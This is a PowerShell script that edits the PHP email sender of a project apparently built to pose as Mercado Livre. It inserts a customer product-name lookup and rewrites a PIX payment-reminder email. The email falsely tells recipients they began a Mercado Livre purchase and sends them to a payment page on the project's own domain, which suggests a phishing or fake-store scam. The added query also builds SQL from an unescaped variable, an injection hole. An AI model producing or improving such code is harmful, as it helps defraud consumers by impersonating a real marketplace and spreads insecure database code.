$file = "c:\Users\studi\Downloads\mercado rm lja\api\phpmailer.php"
$content = [System.IO.File]::ReadAllText($file, [System.Text.Encoding]::UTF8)

# Add product name lookup after the override_produto block
$search = "`$override_produto = `$_REQUEST['override_produto'] ?? '';`r`n`t`t`tif (!empty(`$override_produto)) {`r`n`t`t`t`t`$payment_link = ""`$dominio/payment.php?produto=`$override_produto&cid=`$idCliente"";`r`n`t`t`t}"

$replace = @"
`$override_produto = `$_REQUEST['override_produto'] ?? '';
			if (!empty(`$override_produto)) {
				`$payment_link = "`$dominio/payment.php?produto=`$override_produto&cid=`$idCliente";
			}

			// Buscar nome do produto do cliente
			`$nomeProduto = 'seu produto';
			`$sql_prod = mysqli_query(`$conn, "SELECT produto_nome FROM clientes WHERE id='`$idCliente' LIMIT 1");
			if (`$sql_prod && `$row_prod = mysqli_fetch_assoc(`$sql_prod)) {
				if (!empty(`$row_prod['produto_nome'])) {
					`$nomeProduto = `$row_prod['produto_nome'];
				}
			}
"@

if ($content.Contains($search)) {
    $content = $content.Replace($search, $replace)
    Write-Host "Parte 1 OK - Lookup do produto adicionado"
} else {
    Write-Host "Parte 1 ERRO - Bloco nao encontrado"
    # Try normalized
    $search_n = $search -replace "`r`n", "`n"
    $content_n = $content -replace "`r`n", "`n"
    if ($content_n.Contains($search_n)) {
        $content_n = $content_n.Replace($search_n, ($replace -replace "`r`n", "`n"))
        $content = $content_n -replace "(?<![`r])`n", "`r`n"
        Write-Host "Parte 1 OK (via normalizacao)"
    } else {
        Write-Host "Parte 1 FALHOU completamente"
    }
}

# Update the pending email message  
$oldMsg = "Como o PIX Copia e Cola tem um tempo limite e pode ter expirado, clique no bot"
$newMsg = "Notamos que voc"

if ($content.Contains($oldMsg)) {
    $oldLine = "<p style='font-size: 16px;'>Como o PIX Copia e Cola tem um tempo limite e pode ter expirado, clique no bot" + [char]0x00E3 + "o abaixo para gerar um novo PIX e finalize seu pagamento e garantir sua reserva.</p>"
    $newLine = "<p style='font-size: 16px;'>Notamos que voc" + [char]0x00EA + " iniciou uma compra do produto <strong>`$nomeProduto</strong> no Mercado Livre, mas ainda n" + [char]0x00E3 + "o identificamos o seu pagamento.</p>`r`n        <p style='font-size: 16px;'>Como o PIX Copia e Cola tem um tempo limite e pode ter expirado, clique no bot" + [char]0x00E3 + "o abaixo para acompanhar seu pedido e finalizar o pagamento.</p>"
    $content = $content.Replace($oldLine, $newLine)
    Write-Host "Parte 2 OK - Mensagem do template atualizada"
} else {
    Write-Host "Parte 2 - Tentando busca alternativa..."
    # Search for partial match
    $idx = $content.IndexOf("Como o PIX Copia e Cola")
    Write-Host "Index de 'Como o PIX': $idx"
}

[System.IO.File]::WriteAllText($file, $content, [System.Text.Encoding]::UTF8)
Write-Host "Arquivo salvo"
